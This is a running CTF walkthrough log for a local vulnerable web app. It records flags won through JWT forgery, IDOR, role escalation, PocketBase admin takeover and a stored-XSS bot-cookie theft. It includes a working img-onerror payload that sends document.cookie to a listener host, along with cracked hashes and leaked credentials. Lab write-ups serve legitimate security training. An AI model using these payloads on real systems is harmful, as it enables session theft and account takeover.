# Darkly 42 — Walkthrough (running log)

Target: `http://192.168.1.74:4942` (same as attacker host — app runs locally on this machine)
Attacker machine LAN IP: `192.168.1.63` (old note) / host now at `192.168.1.74`

## Flags found so far: 7 / 10

| # | Flag | Where | Vulnerability |
|---|------|-------|----------------|
| 1 | `FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}` | `/api/grades` (as any authenticated user, via forged JWT) | JWT secret disclosure → forged session |
| 2 | `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}` | `/staff/dashboard` banner, after self role-escalation | Unrestricted `role` field in `PATCH /api/profile` |
| 3 | `FLAG{1d0r_ur_pr0f1l3_1s_m1n3}` | `/profile/{wil's id}` → "Private note" card | IDOR — any user's profile page/`private_note` viewable by id |
| 4 | `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}` | `/api/users/{id}` → `recovery_code` field (benjamin/dorian/thanos) | Same IDOR, surfaces that reset tokens are MD5-based (**formula confirmed: token = md5(email)**) |
| 5 | `FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` | Exfiltrated from the moderation bot's `flag` cookie | Stored XSS in forum comments + privileged bot visits new threads with a non-httpOnly `flag` cookie |
| 6 | `FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}` | `/internal/config` (localhost-only) via SSRF through the moderation bot | Stored XSS chained into a fetch-and-relay SSRF; also leaked PB superuser creds (see `06-*.md`) |
| 7 | `FLAG{th3_und3rsc0r3_sl4sh_kn0ws_th3_w4y}` | PocketBase `internal_audit` collection (note field) | PocketBase superuser takeover with leaked creds → full DB dump (see `07-*.md`) |

Bonus from flag 5's exfil: also captured the **moderator's live session JWT**
(`login: moderator`, `role: student`) — the bot account itself is only
`student`-level; its privilege comes from a server-side bot process (python-httpx
client) that holds its **own PB auth token** (confirmed in PB logs; those
requests succeed where the bot's *browser* fetches 403).

The admin-ladder flags (4 "step-by-step admin" flags) appear to be flags
2 + 6/7-chain related; the exact mapping of the remaining 3 flags to ladder
gates is still unresolved (see Remaining leads).

## Step-by-step walkthrough

### 1. Initial recon
- Fetched `/` — HTML comments from "wil / emilie / sophie" hint at: SQLi history ("fixed, probably"), hardcoded "online students" counter, more hints "if you read HTML source for fun, you'll love this project."
- Footer `DEPLOY LOG` comment (present on **every** page) discloses: JWT secret history — `"42"` → `"42network"` (current).
- Response headers leak internals: `x-pocketbase: http://localhost:8090`, `x-42-internal: campus=paris`.
- `robots.txt` disallows (= points to): `/admin`, `/staff`, `/internal`, `/backup`, `/api/grades`, `/_/`, `/static/uploads/`.
- `/static/js/console_eggs.js` (loaded on every page) has a `window.darkly42` console helper (`hint()`, `whoami()`, `wil()`, `sophie()`, `version()`) — flavor/hints, plus a `jwtDecode()` helper confirming session is a JWT.
- Login page console logs hint: "md5 is not security. some accounts have predictable passwords" + a keyboard easter egg revealing text "psst — jdoe still hasn't changed that password".
- `/reset-password` page reveals the expected email format: `you@student.42.tech`.

### 2. Finding 01 — Password reset token disclosure → account takeover (CRITICAL)
- `POST /reset-password/request` returns the reset token **directly in the `Location` redirect header**, for *any* email (existing or not):
  `location: /reset-password?email=...&token=<32-hex>`
- Used the leaked token against `jdoe@student.42.tech` → `POST /reset-password/confirm` with `new_password` → `302 success` → logged in as `jdoe`, got a real `session` JWT cookie (role: `student`).
- File: `findings/01-password-reset-token-disclosure.md` + `repro-01-reset-takeover.sh`.

### 3. Finding 02 — JWT secret disclosure → forged session → FLAG 1
- Session JWT: header `{"alg":"HS256"}`, payload `{"sub","login","role","exp"}`.
- Signed a forged token with the disclosed secret `"42network"` and arbitrary `role` → accepted by server (`/api/grades`, `/agenda` flipped 302→200).
- `GET /api/grades` (with any valid session) returns **all** of that user's grade rows, including a "Darkly" meta-project (module: Security, `real_42: false`) whose `flag` field = **FLAG 1**.
- Note: `/admin` still 403 "Insufficient privileges" even with forged `role: admin/staff` — gated by something else (not purely the JWT claim).
- File: `findings/02-jwt-secret-forgery-flag1.md`.

### 4. Finding 03 — Self role-escalation via `PATCH /api/profile` → FLAG 2
- `PATCH /api/profile {"role": "..."}`: `staff`/`admin` rejected ("role not assignable"), but `cadet` is accepted and **persists** server-side.
- After re-login (JWT is cached, must refresh), `cadet` role unlocked `/staff` and `/staff/dashboard` (nav shows "Staff area", privilege ladder: Visitor → Student → **Staff campus** (reached) → Staff 42Network → Staff 42).
- Dashboard banner directly contains **FLAG 2**.
- Dashboard also exposed:
  - `GET /api/users` — full user directory (no real privilege check, just "logged in").
  - `GET /api/docs-internal` — API schema: `role_values: [visitor, student, cadet, staff, god]`, confirms `role` writable via PATCH, and `grades` has a `student` query filter.
  - Links to `/projects/download?file=...` (download endpoint, param name = `file`) and PocketBase admin UI at `http://localhost:8090/_/`.
  - HTML comment: "sophie: fix the XSS in the forum comments first" + "the XML agenda import endpoint is not validated server-side" (XXE hint).
- File: `findings/03-self-role-escalation-flag2.md`.

### 5. Finding 04 — IDOR on `/profile/{id}` and `/api/users/{id}` → FLAGS 3 & 4
- `/profile/{id}` (HTML) and `/api/users/{id}` (JSON) have **no ownership check** — any authenticated user (even just `cadet`) can view any other account's full record.
- wil's record (`id: k1asdfeditojrb4`): `private_note` field = **FLAG 3**. Also leaks `pw_hint` (full MD5 hash) for every user this way.
- benjamin/dorian/thanos's records: `recovery_code` field = **FLAG 4**, which also reveals that password-reset tokens are literally MD5 hashes (ties back to Finding 01).
- Confirmed `pw_hint` = `md5(current_password)` by checking jdoe's own hash against the password we set in Finding 01.
- File: `findings/04-profile-idor-flag3.md` (covers flag 3; flag 4 noted here, should fold into same file or new one — **TODO: write a dedicated finding file for flag 4 / recovery_code leak**).

### 6. In-progress / attempted, no result yet
- **Path traversal on `/projects/download?file=`**: endpoint blocks any request containing literal `..` (403 "forbidden") regardless of encoding (`%2e%2e`, double-encoding `%252e`, backslashes, `a/../..`) — these either get blocked (403) or fail silently (404, filename-not-found) because the handler doesn't double-decode. Tried the dashboard's listed PDFs (`staff_guide.pdf` works, 77 bytes, mentions `/internal/config`; `eval_grid.pdf`/`campus_map.pdf`/`bh_calculator.pdf` → 404, don't actually exist on disk; `faq_darkly.pdf` → 25-byte placeholder, no hidden note despite the comment hinting one). **Likely a red herring** (the HTML banter deliberately misdirects) — not fully ruled out, but no traversal bypass found yet.
- **MD5-cracking wil's/sophie's real passwords** (`pw_hint`): got full hashes —
  - wil: `016e483f01da7285d2fd73a688656cb9`
  - sophie: `8158c9a4d583ee162be6424638c56a01`
  - moderator: `372c7937eb6ebb8871d1c464eda768d8`
  - emilie: `049d9ed7258da4d4beda626ff522f53e`
  Tried ~1200 dictionary guesses (names/campus/brand words × common suffixes) — **no hit yet**. Needs a bigger wordlist or a different angle (maybe not meant to be brute-forced; "predictable passwords" might refer to something more specific, e.g. a leak elsewhere).
- **Stored XSS in forum comments**: confirmed exploitable — `POST /forum/{id}/comment` with `content` field renders raw HTML ("HTML is supported for formatting", confirmed by site's own comments). Forum thread hint: *"the moderation bot opens every thread with a live session... and a 'flag' cookie that isn't httpOnly"* — strongly implies posting an XSS payload will get a privileged bot to visit and leak its cookie.
  - Started a local exfil listener on this machine: `python3 /tmp/xss_listener/server.py` on port 8888 (logs to `/tmp/xss_listener/hits.log`), reachable from the target VM at `192.168.1.63:8888` since both are on the same `192.168.1.0/24` LAN.
  - **Not yet fired** — paused here before posting the actual payload.

## Open paths / next steps (in priority order)

1. **Fire the stored-XSS cookie-theft payload** against the forum moderation bot (listener already running at `192.168.1.63:8888`). Likely payload:
   ```html
   <img src=x onerror="fetch('http://192.168.1.63:8888/c?'+encodeURIComponent(document.cookie))">
   ```
   Post via `POST /forum/{thread_id}/comment` with `content=<payload>`, wait, check `hits.log`.
2. **Reflected XSS on `/newsletter`** — subscribe form echoes the email back unescaped (per site comments) — not yet tried.
3. **XXE on the agenda XML import** (`/agenda`) — stdlib `xml.etree`, explicitly called out as "not validated server-side" — could read local files (maybe `/internal/config`, maybe app source) via external entities. Not yet tried.
4. **`/internal/config`** — explicitly "localhost only"; worth checking whether XXE (step 3) or the moderator bot (step 1) can be leveraged as an internal requester (SSRF-by-proxy) to read it, since we can't reach it directly (confirmed 403 from our vantage point).
5. **`/admin`** — still 403 "Insufficient privileges" with every forged/self-escalated role tried so far (`cadet`, `staff`, `admin` via forged JWT). Probably needs either: a real `staff`/`god` login (via cracking wil/sophie, or via the XSS bot-cookie theft), or a distinct bypass. This is likely gated behind the remaining "Staff 42Network" / "Staff 42" privilege-ladder tiers seen on the dashboard.
6. Finish writing up Finding 04b (the `recovery_code`/flag-4 leak) as its own file for completeness.

## Credentials / state established this session
- `jdoe@student.42.tech` / `Pwned1234!` — role `cadet` (escalated from `student`), valid session cookie saved in `/tmp/cookies_jdoe.txt`.

---

# SESSION 2 LOG (2026-10-20 evening)

## 8. Finding 06 — Bot-SSRF relay → `/internal/config` → FLAG 6
- Proved the moderation bot executes **stored** `<img onerror>` payloads on
  every revisit of thread `bbeo32ucx0a65b8` (re-verified repeatedly).
- Discovered `<script>` payloads do **not** execute (bot renders raw comments
  but strips/doesn't run script elements) — all payloads must be inline
  event handlers. `eval(String.fromCharCode(...))` also did NOT fire; plain
  inline JS in the attribute does.
- Posted a fetch-relay payload: bot fetched `/internal/config` (its fetches
  originate from `127.0.0.1` and pass the localhost gate that blocks all our
  direct attempts) and beacons the body to our listener → full config JSON
  with `jwt_secret`, PB admin creds, and FLAG 6.
- **`/api/collect?c=`** (wil's "debug" endpoint, forum HTML comment) is an
  open exfil log: any value appended via `?c=` (also from the bot) is stored
  and returned on GET — far more reliable than the external listener.
- File: `findings/06-stored-xss-bot-ssrf-internal-config-flag6.md`.

## 9. Finding 07 — PocketBase superuser takeover → FLAG 7 (+ full DB control)
- Logged into `http://localhost:8090/api/admins/auth-with-password` with the
  leaked `admin@42network.local` / `Darkly42Admin!`.
- Dumped every collection (`users`, `posts`, `comments`, `projects`,
  `grades`, `newsletter`, `agenda_imports`, `internal_config`,
  `internal_audit`). FLAG 7 found in an `internal_audit` note row.
- Write access proven: PATCHed jdoe → `role: god, level: 42, campus: HQ`;
  rotated wil's and sophie's passwords (PB auth-collection `password` field)
  and logged in as the real staff/god accounts.
- `GET /admin` → 200 "Admin panel" (was 403); sidebar ladder shows all 5
  tiers done; HTML comment: "INTERNAL NOTE: if you can read this, congrats
  on gate 3. one more to go. — sophie". **But no new flag appears on
  `/admin`, `/staff`, or `/staff/dashboard` even as real sophie.**
- File: `findings/07-pocketbase-superuser-db-takeover-flag7.md`.

## 10. Misc confirmed this session
- Reset-token formula: `token = md5(email)` exactly (verified against a
  fresh jdoe token). Staff/god/emilie(42.tech domain) resets are rejected:
  `?error=Staff+and+god+accounts+use+42+SSO` (domain-based).
- benjamin's password cracked from rockyou: **`b3njamin!`** (pw_hint
  verified = md5). Only rockyou hit across all 9 accounts.
- Maintenance thread (wil) contains base64 blob:
  `dmFsaWRhdGlvbl9rZXk9NDJuZXR3b3Jr` → **`validation_key=42network`**.
  Not yet accepted anywhere (see negatives).
- `/backup` response headers leak: `x-backup-agent: rsync/3.2.7`,
  `x-backup-schedule: daily@03:00`,
  `x-backup-dest: localhost:/opt/pocketbase/pb_data`,
  `x-backup-exclude: data/private_notes.txt`.
- PB request logs (6k+ entries) show the bot's httpx client hits
  `/api/collections/users/records/xxv1btvtzaxen5h` ~3000× with **200** —
  i.e. the bot's server-side client has a privileged PB token (admin-level?)
  distinct from its browser session.
- PB `/api/backups` works as admin: created `pb_backup_x.zip` (2.9 MB) but
  **download is 403** ("Insufficient permissions") for the admin token too.
- App is served by FastAPI/uvicorn on this same machine (localhost:4942);
  PocketBase on 0.0.0.0:8090. PB data likely at `/opt/pocketbase/pb_data`.

## Negative results (do NOT re-tread next session)
1. **`/internal/config`** — 403 for every direct attempt: anon, jdoe
   cadet/staff/god, real wil/sophie, bot's stolen moderator JWT + flag
   cookie, HeadlessChrome UA, `Sec-Fetch-*`/`Origin`/`Referer` sets,
   `Host: 127.0.0.1:4942`, `X-Forwarded-*`, `x-42-internal: campus=hq|paris`,
   `validation_key` in query/header/body. ONLY the bot's same-origin
   `fetch()` passes (already exploited for flag 6).
2. **`/backup`** — 403 for everything above, plus OPTIONS/POST → 405 (route
   exists, GET-only, gate unknown). Bot's fetch of `/backup` returns
   **200 but empty body** — promising but unexplained; retry bot-relay on
   `/backup` with full response capture (status + headers + body length).
3. **`/admin` banner** — page subtitle "Staff 42Network+ access required"
   persists even as role=god/level=42/campus=HQ jdoe AND as real sophie
   (role=god) and real wil (role=staff). The ladder widget tracks
   role/level; the *banner is just static text*. Gate 4 ("one more to go")
   is NOT satisfied by anything tried: no flag shown beyond flag-1 echo.
4. **XXE** — internal entities expand, `file://` external entities silently
   produce empty text (expat without external entity support). No OOB (no
   network egress from parser tested but http: entities also return empty).
5. **SSTI** — `{{7*7}}`/`${7*7}`/`<%= %>` in `first_name`/`avatar` render
   literally on profile pages.
6. **`/projects/download` traversal** — every `..` variant 403s; basename
   appears stripped (paths like `data/private_notes.txt` → 404 "not
   found", never 403). PDFs are 25–77 byte placeholders. Likely red herring.
7. **Forum search** — parameterized; `' OR 1=1--`, UNION, error probes: no
   SQLi. Newsletter email echo is HTML-reflected but no bot reads
   `/newsletter` (beacon experiment: no hit).
8. **MD5 cracking** — rockyou (14.3M) + ~4k targeted candidates cracked
   only benjamin. wil/sophie/moderator/emilie resist; brute force is not
   the intended path.
9. **`role not assignable`** — PATCH `/api/profile` rejects staff/admin/god
   (and admin) even with `validation_key` in body/query/header. The ladder
   above `cadet` cannot be self-escalated via the app API.
10. **`<script>` in forum content** — stored and rendered raw in HTML but
    the bot does not execute script elements; only inline event handlers
    (onerror/onload) fire. Design payloads accordingly.
11. **ol / asmith / bmartin** — appear in forum "online" list, admin
    submissions/evals, and newsletter seed rows, but have **no PB user
    records** (`filter=(username=...)` → 0). Not in PB at all.
12. **Bot visit model** — bot does NOT visit arbitrary/new threads on
    creation (two fresh threads got zero comment-executions for ~15 min);
    it keeps re-rendering the same old thread (`bbeo32ucx0a65b8`) every
    ~45–90s. Reliable channel = keep payloads in THAT thread's comments
    (or PATCH an existing one via PB admin).
13. **PB backups download** — admin token insufficient; PUT/POST/DELETE on
    backup files 404/204; `files/..` traversal blocked. Backup zip likely
    only reachable from disk (`/opt/pocketbase/pb_data/backups/`).

## Remaining leads (priority order for next session)
1. **`validation_key=42network`** — found in wil's maintenance thread but
   not accepted anywhere tried so far. Systematically fuzz it against ALL
   app endpoints (query `?validation_key=`, `?key=`, header
   `X-Validation-Key`, body field) — especially `/backup`, `/agenda/import`,
   `/login`, and any un-discovered endpoint. If nothing accepts it, fuzz
   for a hidden endpoint that does (e.g. `/validate`, `/api/validate`,
   `/promote`, `/sso`).
2. **Bot's server-side PB token** — PB logs prove the bot's httpx client
   successfully reads `users/records/xxv1btvtzaxen5h` (200) where browsers
   get 403/404. If that token is admin-level, the bot may be able to do
   more than fetch. Try SSRF-relaying PB API paths that need auth using
   cookies/headers we can't set... or check whether `/api/collect` is
   reachable in a way that makes the *server* perform privileged PB calls.
   Also: inspect whether the bot exposes any endpoint that echoes its own
   PB token.
3. **Gate 4 of the admin ladder** — "one more to go" after gate 3. Gates
   seem to be: (1) student, (2) cadet/staff campus, (3) 42Network/staff,
   (4) god/Staff 42. We satisfy everything visible yet no flag. Hypothesis:
   gate 4 requires the REAL sophie login flow (42 SSO) or a specific
   User-Agent/origin (the real sophie session cookie we hold SHOULD count —
   verify by diffing server behavior: hit `/backup`, `/internal/config`,
   `/admin` with sophie's cookie vs jdoe-god's cookie byte-for-byte).
4. **ol / asmith / bmartin phantom users** — no PB records. Look for a
   second data store: the `/backup` headers point to
   `localhost:/opt/pocketbase/pb_data` and an excluded
   `data/private_notes.txt`. Try to read that file via any remaining
   file-read primitive (bot-SSRF on a file-serving endpoint; check if
   `/projects/download` maps to a different base dir than assumed).
5. **`/backup` via bot with full capture** — rerun the bot-relay with
   response status+headers+body for `/backup` specifically; the empty 200
   suggests the bot CAN reach it but the body render failed (maybe
   binary/rsync output). Also try `/backup?verbose=1` style params.
6. **SSO flow** — login page has a Google button (`/redirect?next=https://
   accounts.google.com`, open redirect confirmed) and reset errors mention
   "42 SSO". An open-redirect → callback loopback (e.g.
   `next=http://localhost:4942/internal/config`) might make the *server*
   fetch internal URLs (server-side redirect follow-up). Cheap to test.
7. **PB `_superusers` / second admin** — only one superuser exists. The
   bot's privileged token (lead 2) may BE a second superuser token; check
   `GET /api/admins` list vs logs timing, and try impersonating via
   `Authorization: <bot-token>` if it ever leaks through `/api/collect`.
8. **`/api/telemetry/heartbeat`** — accepts arbitrary `page` strings and
   200-OKs; unexplored whether a crafted page value triggers anything
   server-side (bot scheduling? see #12 — heartbeat page names might drive
   which URLs the bot visits; test posting heartbeat for `/backup` then
   watching bot behavior).
- Full user directory + MD5 `pw_hint` + `recovery_code` for all 9 accounts captured in `/tmp/out_dashboard.html` and various `/tmp/out_profile_*.html` / direct `curl` output above (not yet saved to a tidy file — **TODO: consolidate into a `findings/notes-userdata.md`**).
